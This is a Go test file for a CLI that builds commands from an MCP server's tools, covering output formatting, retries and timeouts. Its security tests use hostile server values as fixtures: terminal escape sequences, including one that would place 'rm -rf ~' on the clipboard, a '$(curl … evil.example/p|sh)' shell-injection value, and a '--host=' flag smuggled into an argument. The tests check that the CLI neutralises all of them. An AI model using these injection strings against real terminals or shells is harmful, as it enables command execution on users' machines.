package cmd

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/firmfact/cli/internal/config"
	"github.com/firmfact/cli/internal/mcp"
)

// mcpServer fakes the MCP endpoint and records each tools/call.
type mcpServer struct {
	mu     sync.Mutex
	called []toolCall
	result string // the tools/call result, as JSON
	// stream answers tools/call as an event stream, the way the server
	// answers a chat: a started event and a ping before the response.
	stream bool
	// busy turns away that many calls first with the server's capacity
	// guard's 503 and Retry-After: 1; lost, after those, that many with a
	// proxy's 502. Every call counts in called.
	busy, lost int
	// unknown answers that many calls first with JSON-RPC's method not
	// found, as the server answers a tool it does not have; unknownText,
	// after those, that many with its tool error for one.
	unknown, unknownText int
	// tools is the tools/list answer; lists counts the requests for it.
	tools []mcp.Tool
	lists int
	// respond, when set, is the tools/call result for each call in place
	// of result, such as the page a call asks for.
	respond func(call toolCall) string
}

type toolCall struct {
	Name      string         `json:"name"`
	Arguments map[string]any `json:"arguments"`
}

func (f *mcpServer) start(t *testing.T) *httptest.Server {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/mcp" {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		var req struct {
			ID     int      `json:"id"`
			Method string   `json:"method"`
			Params toolCall `json:"params"`
		}
		_ = json.NewDecoder(r.Body).Decode(&req)
		w.Header().Set("Content-Type", "application/json")
		answer := fmt.Sprintf(`{"jsonrpc":"2.0","id":%d,"result":%s}`, req.ID, f.result)
		switch req.Method {
		case "initialize":
			w.Header().Set("mcp-session-id", "sess-1")
			io.WriteString(w, `{"jsonrpc":"2.0","id":1,"result":{}}`)
		case "tools/list":
			f.mu.Lock()
			f.lists++
			tools := f.tools
			f.mu.Unlock()
			if tools == nil {
				t.Errorf("unexpected tools/list")
			}
			fmt.Fprintf(w, `{"jsonrpc":"2.0","id":%d,"result":{"tools":%s}}`, req.ID, mustJSON(t, tools))
		case "tools/call":
			f.mu.Lock()
			f.called = append(f.called, req.Params)
			n := len(f.called)
			f.mu.Unlock()
			switch {
			case n <= f.unknown:
				fmt.Fprintf(w, `{"jsonrpc":"2.0","id":%d,"error":{"code":-32601,"message":"Unknown tool: %s"}}`, req.ID, req.Params.Name)
				return
			case n <= f.unknown+f.unknownText:
				fmt.Fprintf(w, `{"jsonrpc":"2.0","id":%d,"result":{"isError":true,"content":[{"type":"text","text":"Tool execution failed: Unknown tool: %s"}]}}`, req.ID, req.Params.Name)
				return
			case n <= f.unknown+f.unknownText+f.busy:
				w.Header().Set("Retry-After", "1")
				w.WriteHeader(http.StatusServiceUnavailable)
				io.WriteString(w, `{"error":"Unable to acquire capacity, please retry"}`)
				return
			case n <= f.unknown+f.unknownText+f.busy+f.lost:
				w.Header().Set("Content-Type", "text/html")
				w.WriteHeader(http.StatusBadGateway)
				io.WriteString(w, "<html><body>502 Bad Gateway</body></html>")
				return
			}
			if f.respond != nil {
				answer = fmt.Sprintf(`{"jsonrpc":"2.0","id":%d,"result":%s}`, req.ID, f.respond(req.Params))
			}
			if !f.stream {
				io.WriteString(w, answer)
				return
			}
			w.Header().Set("Content-Type", "text/event-stream")
			fmt.Fprint(w, "retry: 3000\nevent: message\ndata: {\"type\":\"started\"}\n\n")
			w.(http.Flusher).Flush()
			fmt.Fprint(w, "event: message\ndata: {\"type\":\"ping\"}\n\n")
			fmt.Fprintf(w, "event: message\ndata: %s\n\n", compactJSON(t, answer))
		default:
			t.Errorf("unexpected MCP method %q", req.Method)
		}
	}))
	t.Cleanup(srv.Close)
	return srv
}

// compactJSON puts raw on one line, as an event's data line needs it.
func compactJSON(t *testing.T, raw string) string {
	var buf bytes.Buffer
	if err := json.Compact(&buf, []byte(raw)); err != nil {
		t.Fatal(err)
	}
	return buf.String()
}

func (f *mcpServer) calls() []toolCall {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]toolCall(nil), f.called...)
}

func (f *mcpServer) listed() int {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.lists
}

// vendorsResult is a list_vendors answer as the server sends it for a Demo
// workspace: a note, the stamped rows and the paging meta, each in its own
// text block.
const vendorsResult = `{"isError":false,"content":[
	{"type":"text","text":"Demo workspace: this is sample data."},
	{"type":"text","text":"{\"workspace_data_source\":\"demo_sample_data\",\"data\":[{\"name\":\"Acme\",\"id\":\"v1\",\"annual_cost\":1200.5,\"tags\":[\"x\"]},{\"name\":\"Globex\",\"id\":\"v2\",\"annual_cost\":80}]}"},
	{"type":"text","text":"{\"meta\":{\"page\":1,\"total_pages\":2,\"total_count\":3}}"}]}`

// The hints the server gives its tools (tool_registry.rb): each one only
// reads, but the chat, which saves its thread, so writes, but only adds.
var (
	readsOnly = &mcp.ToolAnnotations{ReadOnlyHint: hint(true), DestructiveHint: hint(false)}
	addsOnly  = &mcp.ToolAnnotations{ReadOnlyHint: hint(false), DestructiveHint: hint(false)}
)

func hint(b bool) *bool { return &b }

// listVendors takes paging and fields as the server's list tools do
// (list_tool_schema in tool_registry.rb), and a few arguments of other
// types.
var listVendors = mcp.Tool{
	Name:        "list_vendors",
	Title:       "List vendors",
	Annotations: readsOnly,
	InputSchema: map[string]any{
		"type": "object",
		"properties": map[string]any{
			"search":    map[string]any{"type": "string"},
			"per_page":  map[string]any{"type": "integer"},
			"active":    map[string]any{"type": "boolean"},
			"workspace": map[string]any{"type": "string"},
			"page":      map[string]any{"type": "integer", "minimum": 1},
			"limit":     map[string]any{"type": "integer", "minimum": 1, "maximum": 200},
			"fields":    map[string]any{"type": "array", "items": map[string]any{"type": "string"}},
		},
	},
}

// signedInWithTools stores a token and a tool cache for host, as login does.
func signedInWithTools(t *testing.T, host string, tools ...mcp.Tool) {
	t.Helper()
	if err := config.SaveToken(host, &config.Token{AccessToken: "at", ExpiresAt: time.Now().Add(time.Hour)}); err != nil {
		t.Fatal(err)
	}
	if err := saveToolCache(host, tools); err != nil {
		t.Fatal(err)
	}
}

// The generated commands come from the tool cache of the host named by
// --host: `vendors list` calls list_vendors with the flags that were set and
// the workspace, prints the rows as a table, and the count, the paging and
// the Demo notice on stderr.
func TestGeneratedCommandFollowsHost(t *testing.T) {
	isolate(t)
	f := &mcpServer{result: vendorsResult}
	srv := f.start(t)
	signedInWithTools(t, srv.URL, listVendors)

	stdout, stderr, err := run("test", "--host", srv.URL, "--workspace", "ws-1", "vendors", "list", "--search", "acme", "--per-page", "2")
	if err != nil {
		t.Fatalf("vendors list: %v", err)
	}

	calls := f.calls()
	if len(calls) != 1 || calls[0].Name != "list_vendors" {
		t.Fatalf("calls = %+v", calls)
	}
	want := map[string]any{"search": "acme", "per_page": float64(2), "workspace": "ws-1"}
	if got, _ := json.Marshal(calls[0].Arguments); string(got) != mustJSON(t, want) {
		t.Errorf("arguments = %s, want %s (unset flags are left out)", got, mustJSON(t, want))
	}

	lines := strings.Split(strings.TrimSpace(stdout), "\n")
	if len(lines) != 3 || strings.Join(strings.Fields(lines[0]), " ") != "NAME ID ANNUAL COST" ||
		strings.Join(strings.Fields(lines[1]), " ") != "Acme v1 1,200.50" {
		t.Errorf("table = %q", stdout)
	}
	if stderr != "3 vendors (page 1 of 2; use --page 2 or --all).\nSample data in a Demo workspace, not your own spend.\n" {
		t.Errorf("stderr = %q", stderr)
	}

	// Another host has no such command.
	_, _, err = run("test", "--host", "http://127.0.0.1:1", "vendors", "list")
	if err == nil || !strings.Contains(err.Error(), `unknown command "vendors"`) {
		t.Errorf("want an unknown command for a host without cached tools, got %v", err)
	}
}

// --json prints the merged result on stdout, so scripts can read it whole.
func TestGeneratedCommandJSON(t *testing.T) {
	isolate(t)
	f := &mcpServer{result: vendorsResult}
	srv := f.start(t)
	signedInWithTools(t, srv.URL, listVendors)

	stdout, _, err := run("test", "--host", srv.URL, "--json", "vendors", "list", "--active")
	if err != nil {
		t.Fatalf("vendors list --json: %v", err)
	}
	var got struct {
		Data []map[string]any `json:"data"`
		Meta map[string]any   `json:"meta"`
	}
	if err := json.Unmarshal([]byte(stdout), &got); err != nil {
		t.Fatalf("stdout is not JSON: %v\n%s", err, stdout)
	}
	if len(got.Data) != 2 || got.Meta["total_count"] != float64(3) {
		t.Errorf("result = %+v", got)
	}
	if calls := f.calls(); len(calls) != 1 || calls[0].Arguments["active"] != true {
		t.Errorf("calls = %+v", calls)
	}
}

// A tool error becomes the command's error.
func TestGeneratedCommandToolError(t *testing.T) {
	isolate(t)
	f := &mcpServer{result: `{"isError":true,"content":[{"type":"text","text":"Workspace not found\n"}]}`}
	srv := f.start(t)
	signedInWithTools(t, srv.URL, listVendors)

	_, _, err := run("test", "--host", srv.URL, "vendors", "list")
	if err == nil || err.Error() != "Workspace not found" {
		t.Fatalf("want the tool's error, got %v", err)
	}
}

func mustJSON(t *testing.T, v any) string {
	t.Helper()
	raw, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	return string(raw)
}

// osc52 asks the terminal to put "rm -rf ~" on the clipboard.
const osc52 = "\x1b]52;c;cm0gLXJmIH4=\x07"

// assertNoTerminalControls fails when s holds anything a terminal would act
// on: C0 controls other than tab and newline, DEL, C1, or bytes that are not
// UTF-8 (a lone 0x9b is CSI to a terminal outside UTF-8 mode).
func assertNoTerminalControls(t *testing.T, where, s string) {
	t.Helper()
	if !utf8.ValidString(s) {
		t.Errorf("%s: not valid UTF-8: %q", where, s)
	}
	for i, r := range s {
		if r < 0x20 && r != '\n' && r != '\t' || r >= 0x7f && r <= 0x9f {
			t.Errorf("%s: control %U at byte %d in %q", where, r, i, s)
			return
		}
	}
}

// A hostile or spoofed server cannot drive the terminal through a tool: its
// title, description, flag help, notes, table cells, paging meta, display
// block and errors all arrive with control characters escaped, and --json
// stays equivalent.
func TestServerTextCannotDriveTheTerminal(t *testing.T) {
	isolate(t)
	link := "\x1b]8;;https://evil.example\x1b\\Acme\x1b]8;;\x1b\\"
	rows := mustJSON(t, map[string]any{"workspace_data_source": "demo_sample_data", "data": []any{
		map[string]any{"name": link, "id": "v1\u009b2K", "remark": "two\nlines\tand a tab", "cost": 12.5},
	}})
	display := map[string]any{
		"schema":        "list_display/1",
		"title":         "Vendors\x1b]0;pwned\x07",
		"workspace":     map[string]any{"name": "Demo\x1b[2J", "demo": true},
		"base_currency": "EUR\u009b31m",
		"columns": []any{
			map[string]any{"key": "name", "label": "Name\x1b[5m"},
			map[string]any{"key": "remark", "label": "Re\u202emark"},
			map[string]any{"key": "cost", "label": "Cost" + osc52, "kind": "money", "unit": "base_currency"},
		},
		"hidden":    []any{"id"},
		"labels":    map[string]any{"id": "I\x1b[2Kd"},
		"footnotes": []any{"Cost: " + osc52},
		"notice":    "Sample\x1b[5m data.",
	}
	meta := mustJSON(t, map[string]any{"meta": map[string]any{"page": "1\x1b[2J", "total_pages": 2, "total_count": 3, "display": display}})
	f := &mcpServer{result: mustJSON(t, map[string]any{"isError": false, "content": []any{
		map[string]any{"type": "text", "text": "Heads up. " + osc52},
		map[string]any{"type": "text", "text": rows},
		map[string]any{"type": "text", "text": meta},
	}})}
	srv := f.start(t)
	tool := mcp.Tool{
		Name:        "list_vendors",
		Title:       "List vendors\x1b]0;pwned\x07",
		Description: "Lists vendors." + osc52,
		InputSchema: map[string]any{"type": "object", "properties": map[string]any{
			"search": map[string]any{"type": "string", "description": "match \u009b31mnames", "enum": []any{"a\x1b[2K"}},
		}},
		Annotations: readsOnly,
	}
	signedInWithTools(t, srv.URL, tool)

	stdout, stderr, err := run("test", "--host", srv.URL, "vendors", "list")
	if err != nil {
		t.Fatalf("vendors list: %v", err)
	}
	assertNoTerminalControls(t, "stdout", stdout)
	assertNoTerminalControls(t, "stderr", stderr)
	if !strings.Contains(stderr, `Heads up. \u001b]52;c;cm0gLXJmIH4=\u0007`) || !strings.Contains(stderr, `Sample\u001b[5m data.`) {
		t.Errorf("the notes should stay readable with their escapes shown: %q", stderr)
	}
	// This tool takes no page, so there is no flag to suggest.
	if !strings.Contains(stderr, `(page 1\u001b[2J of 2)`) {
		t.Errorf("stderr = %q", stderr)
	}
	lines := strings.Split(strings.TrimSpace(stdout), "\n")
	if len(lines) != 6 || !strings.Contains(lines[3], `\u001b]8;;https://evil.example\u001b\Acme`) ||
		!strings.Contains(lines[3], "two lines and a tab") || !strings.Contains(lines[3], "12.50") {
		t.Errorf("each row must stay one line with escapes shown: %q", stdout)
	}
	for _, want := range []string{`Vendors\u001b]0;pwned\u0007 in Demo\u001b[2J (sample data)`, `costs in EUR\u009b31m`, `NAME\U001B[5M`, `RE\U202EMARK`, `COST\U001B]52;`, `Cost: \u001b]52;`} {
		if !strings.Contains(stdout, want) {
			t.Errorf("stdout lacks %q: %q", want, stdout)
		}
	}
	wide, _, err := run("test", "--host", srv.URL, "vendors", "list", "--wide")
	if err != nil {
		t.Fatal(err)
	}
	assertNoTerminalControls(t, "--wide", wide)
	if !strings.Contains(wide, `I\U001B[2KD`) || !strings.Contains(wide, `v1\u009b2K`) {
		t.Errorf("--wide = %q", wide)
	}

	help, _, err := run("test", "--host", srv.URL, "vendors", "list", "--help")
	if err != nil {
		t.Fatalf("--help: %v", err)
	}
	assertNoTerminalControls(t, "help", help)
	if !strings.Contains(help, `Lists vendors.\u001b]52;`) || !strings.Contains(help, `match \u009b31mnames (one of: a\u001b[2K)`) {
		t.Errorf("help = %q", help)
	}
	group, _, err := run("test", "--host", srv.URL, "vendors", "--help")
	if err != nil {
		t.Fatalf("vendors --help: %v", err)
	}
	assertNoTerminalControls(t, "group help", group)
	if !strings.Contains(group, `List vendors\u001b]0;pwned\u0007`) {
		t.Errorf("the title should show its escapes: %q", group)
	}

	jsonOut, _, err := run("test", "--host", srv.URL, "--json", "vendors", "list")
	if err != nil {
		t.Fatalf("--json: %v", err)
	}
	assertNoTerminalControls(t, "--json", jsonOut)
	var got struct {
		Data  []map[string]any `json:"data"`
		Notes []string         `json:"notes"`
	}
	if err := json.Unmarshal([]byte(jsonOut), &got); err != nil || len(got.Data) != 1 {
		t.Fatalf("--json is not the result: %v\n%s", err, jsonOut)
	}
	if got.Data[0]["id"] != "v1\u009b2K" || got.Data[0]["name"] != link {
		t.Errorf("--json must still decode to the server's values, got %q", got.Data[0])
	}
	if len(got.Notes) != 1 || got.Notes[0] != "Heads up. "+osc52 {
		t.Errorf("--json notes must decode to the server's text, got %q", got.Notes)
	}

	failing := &mcpServer{result: mustJSON(t, map[string]any{"isError": true, "content": []any{
		map[string]any{"type": "text", "text": "Workspace not found" + osc52},
	}})}
	failingSrv := failing.start(t)
	signedInWithTools(t, failingSrv.URL, tool)
	_, stderr, err = run("test", "--host", failingSrv.URL, "vendors", "list")
	if err == nil {
		t.Fatal("want the tool's error")
	}
	assertNoTerminalControls(t, "error", err.Error())
	assertNoTerminalControls(t, "stderr", stderr)
	if !strings.HasPrefix(err.Error(), `Workspace not found\u001b]52;`) {
		t.Errorf("error = %q", err)
	}
}

// The three answers the server gives, as its MCP controller builds them and
// its tests pin them (successful_tool_content, mcp_controller_test.rb): a
// Demo workspace stamps its data and leads with a notice, any other
// workspace sends a list as a bare array, and chat answers with one object.
// Each list is followed by the paging block.
const (
	demoNotice   = "DEMO WORKSPACE: every figure in this response is fictitious sample data for product evaluation, not the user's real spend."
	vendorRows   = `[{"name":"Acme","temporal_id":"v1","cost":1200.5},{"name":"Globex","temporal_id":"v2","cost":80}]`
	pagingBlock  = `{"meta":{"total_count":3,"page":1,"per_page":2,"total_pages":2},"total_count":3,"truncated":true,"note":"Showing 2 of 3 records. Use page to retrieve other pages."}`
	emptyPaging  = `{"meta":{"total_count":0,"page":1,"per_page":25,"total_pages":0}}`
	chatAnswer   = `{"response":"Hello from MCP","thread_id":"t-1"}`
	demoChatData = `{"response":"Hello from MCP","thread_id":"t-1","workspace_data_source":"demo_sample_data"}`
)

// toolResult is a successful tools/call result with one text block each.
func toolResult(t *testing.T, blocks ...string) string {
	t.Helper()
	content := make([]any, len(blocks))
	for i, b := range blocks {
		content[i] = map[string]any{"type": "text", "text": b}
	}
	return mustJSON(t, map[string]any{"isError": false, "content": content})
}

// chatWithWorkspace has the server's input schema (register_chat_tool in
// tool_registry.rb): a question, and the thread to continue.
var chatWithWorkspace = mcp.Tool{
	Name:        "chat_with_workspace",
	Title:       "Chat with workspace",
	Annotations: addsOnly,
	InputSchema: map[string]any{"type": "object", "properties": map[string]any{
		"message":   map[string]any{"type": "string"},
		"thread_id": map[string]any{"type": "string"},
		"workspace": map[string]any{"type": "string"},
	}, "required": []any{"message"}},
}

// Rows reach the table and --json whatever the kind of workspace, and --json
// has the same three keys for every answer. A real workspace's list used to
// print only its paging block: the bare array of rows was dropped because a
// JSON object had come back beside it.
func TestToolResultShapes(t *testing.T) {
	cases := []struct {
		name   string
		blocks []string
		args   []string
		demo   bool
		rows   int // -1: not a list
		paged  bool
	}{
		{"demo list", []string{demoNotice, `{"workspace_data_source":"demo_sample_data","data":` + vendorRows + `}`, pagingBlock}, []string{"vendors", "list"}, true, 2, true},
		{"non-demo list", []string{vendorRows, pagingBlock}, []string{"vendors", "list"}, false, 2, true},
		{"demo empty list", []string{demoNotice, `{"workspace_data_source":"demo_sample_data","data":[]}`, emptyPaging}, []string{"vendors", "list"}, true, 0, false},
		{"non-demo empty list", []string{`[]`, emptyPaging}, []string{"vendors", "list"}, false, 0, false},
		{"chat", []string{chatAnswer}, []string{"chat-with-workspace", "--message", "Hi"}, false, -1, false},
		{"demo chat", []string{demoNotice, demoChatData}, []string{"chat-with-workspace", "--message", "Hi"}, true, -1, false},
	}
	data := map[string]string{}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			isolate(t)
			srv := (&mcpServer{result: toolResult(t, tc.blocks...)}).start(t)
			signedInWithTools(t, srv.URL, listVendors, chatWithWorkspace)
			args := append([]string{"--host", srv.URL}, tc.args...)

			stdout, stderr, err := run("test", args...)
			if err != nil {
				t.Fatalf("human: %v", err)
			}
			switch {
			case tc.rows > 0:
				lines := strings.Split(strings.TrimSpace(stdout), "\n")
				if len(lines) != tc.rows+1 || !strings.HasPrefix(lines[0], "NAME") ||
					!strings.HasPrefix(lines[1], "Acme") || !strings.HasPrefix(lines[2], "Globex") {
					t.Errorf("want a table of %d rows, got %q", tc.rows, stdout)
				}
			case tc.rows == 0:
				if stdout != "No vendors found.\n" {
					t.Errorf("stdout = %q", stdout)
				}
				if strings.Contains(stderr, "0 vendors") {
					t.Errorf("an empty list needs no total: %q", stderr)
				}
			default:
				if stdout != "Hello from MCP\n" {
					t.Errorf("want the answer as text, got %q", stdout)
				}
			}
			// A person gets a line of their own, not the assistant's notice.
			if strings.Contains(stderr, "Sample data in a Demo workspace, not your own spend.") != tc.demo || strings.Contains(stderr, "DEMO WORKSPACE") {
				t.Errorf("the Demo notice belongs on stderr for Demo data only: %q", stderr)
			}
			if tc.paged && !strings.Contains(stderr, "3 vendors (page 1 of 2; use --page 2 or --all).") {
				t.Errorf("stderr = %q", stderr)
			}
			if strings.Contains(stderr, "Use page to") {
				t.Errorf("the paging note is for --json; stderr has the total line: %q", stderr)
			}

			stdout, _, err = run("test", append([]string{"--json"}, args...)...)
			if err != nil {
				t.Fatalf("--json: %v", err)
			}
			var keys map[string]json.RawMessage
			if err := json.Unmarshal([]byte(stdout), &keys); err != nil {
				t.Fatalf("--json is not an object: %v\n%s", err, stdout)
			}
			if len(keys) != 3 || keys["data"] == nil || keys["meta"] == nil || keys["notes"] == nil {
				t.Errorf("want exactly data, meta and notes, got %s", stdout)
			}
			var got struct {
				Data  any            `json:"data"`
				Meta  map[string]any `json:"meta"`
				Notes []string       `json:"notes"`
			}
			if err := json.Unmarshal([]byte(stdout), &got); err != nil {
				t.Fatal(err)
			}
			data[tc.name] = string(keys["data"])
			if tc.rows >= 0 {
				rows, ok := got.Data.([]any)
				if !ok || len(rows) != tc.rows {
					t.Errorf("data = %s, want %d rows", keys["data"], tc.rows)
				} else if tc.rows > 0 && rows[0].(map[string]any)["name"] != "Acme" {
					t.Errorf("data = %s", keys["data"])
				}
			} else if answer, _ := got.Data.(map[string]any); answer["response"] != "Hello from MCP" || len(answer) != 2 {
				t.Errorf("data = %s", keys["data"])
			}
			if source, _ := got.Meta["workspace_data_source"].(string); (source == "demo_sample_data") != tc.demo {
				t.Errorf("meta = %v: the Demo stamp belongs in meta for Demo data only", got.Meta)
			}
			if tc.demo && (len(got.Notes) == 0 || got.Notes[0] != demoNotice) {
				t.Errorf("notes = %q", got.Notes)
			}
			if tc.paged {
				if got.Meta["total_count"] != float64(3) || got.Meta["truncated"] != true || got.Meta["total_pages"] != float64(2) {
					t.Errorf("meta = %v", got.Meta)
				}
				if n := len(got.Notes); n == 0 || !strings.HasPrefix(got.Notes[n-1], "Showing 2 of 3 records.") {
					t.Errorf("notes = %q", got.Notes)
				}
			}
		})
	}
	for _, pair := range [][2]string{{"demo list", "non-demo list"}, {"demo empty list", "non-demo empty list"}, {"demo chat", "chat"}} {
		if data[pair[0]] != data[pair[1]] {
			t.Errorf("%s and %s should print the same data:\n%s\n%s", pair[0], pair[1], data[pair[0]], data[pair[1]])
		}
	}
}

// A result in a shape the CLI does not know keeps every value under data
// instead of dropping some.
func TestParseToolResultKeepsUnknownShapes(t *testing.T) {
	parse := func(blocks ...string) toolOutput {
		content := make([]mcp.Content, len(blocks))
		for i, b := range blocks {
			content[i] = mcp.Content{Type: "text", Text: b}
		}
		return parseToolResult(content)
	}
	cases := map[string]struct {
		blocks []string
		want   string
	}{
		"two arrays":                   {[]string{`[1]`, `[2]`}, `[[1],[2]]`},
		"an object and an array":       {[]string{`{"period":"2026"}`, `[1]`}, `{"data":[1],"period":"2026"}`},
		"an object with data and more": {[]string{`{"data":[1],"total_results":1}`, `[2]`}, `[{"data":[1],"total_results":1},[2]]`},
		"a note beside other fields":   {[]string{`{"note":"n","entities":[]}`}, `{"entities":[],"note":"n"}`},
		"meta that is not an object":   {[]string{`{"meta":"m"}`}, `{"meta":"m"}`},
		"an analysis":                  {[]string{`{"analysis_type":"cost_trends","data":[1]}`}, `{"analysis_type":"cost_trends","data":[1]}`},
		"nothing but a note":           {[]string{"Just a note"}, `null`},
	}
	for name, tc := range cases {
		out := parse(tc.blocks...)
		if got := mustJSON(t, out.Data); got != tc.want {
			t.Errorf("%s: data = %s, want %s", name, got, tc.want)
		}
	}
	if out := parse("Just a note"); len(out.Notes) != 1 || len(out.shown) != 1 || len(out.Meta) != 0 {
		t.Errorf("notes = %q, meta = %v", out.Notes, out.Meta)
	}
}

// A chat the server answers as an event stream prints like any other
// answer, and a script (no terminal) gets no ticker on stderr.
func TestChatAnsweredAsAStream(t *testing.T) {
	isolate(t)
	f := &mcpServer{result: toolResult(t, chatAnswer), stream: true}
	srv := f.start(t)
	signedInWithTools(t, srv.URL, chatWithWorkspace)

	stdout, stderr, err := run("test", "--host", srv.URL, "chat-with-workspace", "--message", "Hi")
	if err != nil {
		t.Fatal(err)
	}
	if stdout != "Hello from MCP\n" {
		t.Errorf("stdout = %q", stdout)
	}
	if strings.Contains(stderr, "Thinking") || strings.Contains(stderr, "Continue") {
		t.Errorf("stderr = %q, want no ticker or hint without a terminal", stderr)
	}
	if calls := f.calls(); len(calls) != 1 || calls[0].Arguments["message"] != "Hi" {
		t.Errorf("calls = %+v", calls)
	}
}

// An answer that does not come in time says what to do: a proxy's error
// page becomes a sentence instead of "Gateway Timeout", and a stream that
// stalls ends at the limit with a pointer to --timeout.
func TestSlowChatAnswers(t *testing.T) {
	isolate(t)
	var stall atomic.Bool
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var req struct {
			Method string `json:"method"`
		}
		_ = json.NewDecoder(r.Body).Decode(&req)
		if req.Method == "initialize" {
			w.Header().Set("mcp-session-id", "sess-1")
			io.WriteString(w, `{"jsonrpc":"2.0","id":1,"result":{}}`)
			return
		}
		if stall.Load() {
			w.Header().Set("Content-Type", "text/event-stream")
			io.WriteString(w, "data: {\"type\":\"started\"}\n\n")
			w.(http.Flusher).Flush()
			<-r.Context().Done()
			return
		}
		w.Header().Set("Content-Type", "text/html")
		w.WriteHeader(http.StatusGatewayTimeout)
		io.WriteString(w, "<html><body><h1>504 Gateway Time-out</h1></body></html>")
	}))
	defer srv.Close()
	signedInWithTools(t, srv.URL, chatWithWorkspace)

	_, _, err := run("test", "--host", srv.URL, "chat-with-workspace", "--message", "Hi")
	if want := "the server took too long to answer; try a narrower question or retry"; err == nil || err.Error() != want {
		t.Errorf("504 page: err = %v, want %q", err, want)
	}

	stall.Store(true)
	_, _, err = run("test", "--host", srv.URL, "--timeout", "300ms", "chat-with-workspace", "--message", "Hi")
	want := strings.TrimPrefix(srv.URL, "http://") + " did not finish answering within 300ms; allow longer with --timeout, or run `firmfact doctor`"
	if err == nil || err.Error() != want {
		t.Errorf("stalled stream: err = %v, want %q", err, want)
	}
}

// A busy server's 503 with a Retry-After is waited out and the call sent
// again. Stderr that is no terminal, such as a script's log, hears nothing
// of the wait.
func TestBusyServerIsWaitedOutQuietly(t *testing.T) {
	isolate(t)
	f := &mcpServer{result: vendorsResult, busy: 1}
	srv := f.start(t)
	signedInWithTools(t, srv.URL, listVendors)

	stdout, stderr, err := run("test", "--host", srv.URL, "vendors", "list")
	if err != nil {
		t.Fatalf("vendors list: %v", err)
	}
	if n := len(f.calls()); n != 2 {
		t.Errorf("calls = %d, want 2", n)
	}
	if !strings.Contains(stdout, "Acme") {
		t.Errorf("stdout = %q, want the vendors", stdout)
	}
	if strings.Contains(stderr, "busy") {
		t.Errorf("stderr = %q, want no word of the wait off a terminal", stderr)
	}
}

// A tool the server marks read-only is called once more after a proxy's
// 502, from its generated command and from `call`, which finds the hint in
// the tool cache; a tool that writes is not.
func TestReadOnlyToolIsCalledAgainAfterAGatewayError(t *testing.T) {
	isolate(t)
	for _, args := range [][]string{{"vendors", "list"}, {"call", "list_vendors"}} {
		f := &mcpServer{result: vendorsResult, lost: 1}
		srv := f.start(t)
		signedInWithTools(t, srv.URL, listVendors)
		if _, _, err := run("test", append([]string{"--host", srv.URL}, args...)...); err != nil {
			t.Errorf("%v: %v", args, err)
		}
		if n := len(f.calls()); n != 2 {
			t.Errorf("%v: calls = %d, want 2", args, n)
		}
	}

	f := &mcpServer{result: vendorsResult, lost: 1}
	srv := f.start(t)
	writer := listVendors
	writer.Annotations = addsOnly
	signedInWithTools(t, srv.URL, writer)
	_, _, err := run("test", "--host", srv.URL, "vendors", "list")
	if err == nil || !strings.Contains(err.Error(), "took too long") {
		t.Errorf("err = %v, want the gateway's error", err)
	}
	if n := len(f.calls()); n != 1 {
		t.Errorf("calls = %d, want 1 for a tool that writes", n)
	}
}

// A value on a command line the user is shown to paste is as it is, in
// double quotes, or, when no quoting reads the same in bash, zsh, fish,
// PowerShell and cmd, the placeholder: a value from the server must not be
// able to plant a command there.
func TestShellWord(t *testing.T) {
	for _, c := range []struct{ in, want string }{
		{"0199a3c2-5b7e-7d41-9e0a-6f2d8c1b4a53", "0199a3c2-5b7e-7d41-9e0a-6f2d8c1b4a53"},
		{"jan.de-vries+cli@bank.example", "jan.de-vries+cli@bank.example"},
		{"Zürich", "Zürich"},
		{"Acme Bank", `"Acme Bank"`},
		{"O'Brien & Zonen (NL)", `"O'Brien & Zonen (NL)"`},
		{"@all", `"@all"`},
		{"=ls", `"=ls"`},
		{"", `""`},
		{"x$(curl -s evil.example/p|sh)", "<id>"},
		{"$HOME", "<id>"},
		{"x`id`", "<id>"},
		{`trailing\`, "<id>"},
		{`say "hi"`, "<id>"},
		{"%PATH%", "<id>"},
		{"wow!", "<id>"},
		{"a\u201cb", "<id>"},
		{"line\nbreak", "<id>"},
		{"Acme\u202eknaB", "<id>"},
		{"Ac\u200bme", "<id>"},
		{"\xff", "<id>"},
	} {
		if got := shellWord(c.in, "<id>"); got != c.want {
			t.Errorf("shellWord(%q) = %s, want %s", c.in, got, c.want)
		}
	}
}

// A word in the place of an argument that starts with - would be read as
// a flag, quoted or not, and could send the pasted command to another
// host; the placeholder takes its place. After a flag it is that flag's
// value, and prints as shellWord has it.
func TestArgWord(t *testing.T) {
	for _, c := range []struct{ in, want string }{
		{"prod-1", "prod-1"},
		{"Acme Bank", `"Acme Bank"`},
		{"--host=https://evil.example", "<id>"},
		{"-x", "<id>"},
		{"-", "<id>"},
		{"$HOME", "<id>"},
	} {
		if got := argWord(c.in, "<id>"); got != c.want {
			t.Errorf("argWord(%q) = %s, want %s", c.in, got, c.want)
		}
	}
	if got := shellWord("-x", "<id>"); got != "-x" {
		t.Errorf("shellWord(-x) = %s", got)
	}

	// The command that checks on a setup later names the workspace as an
	// argument.
	app := &App{Name: "firmfact", Workspace: "ws-other"}
	for id, want := range map[string]string{
		"prod-1":                      "firmfact workspaces status prod-1",
		"--host=https://evil.example": "firmfact workspaces status <workspace-id>",
	} {
		if got := (setupWait{workspace: Workspace{ID: id}}).statusCommand(app); got != want {
			t.Errorf("statusCommand for %q = %s, want %s", id, got, want)
		}
	}
}

// A name in a sentence is quoted when it has spaces, whatever else it has;
// it is not a command line.
func TestNameInText(t *testing.T) {
	for in, want := range map[string]string{"Demo": "Demo", "Acme Bank": `"Acme Bank"`, `Say "hi" $5`: `"Say \"hi\" $5"`} {
		if got := nameInText(in); got != want {
			t.Errorf("nameInText(%q) = %s, want %s", in, got, want)
		}
	}
}
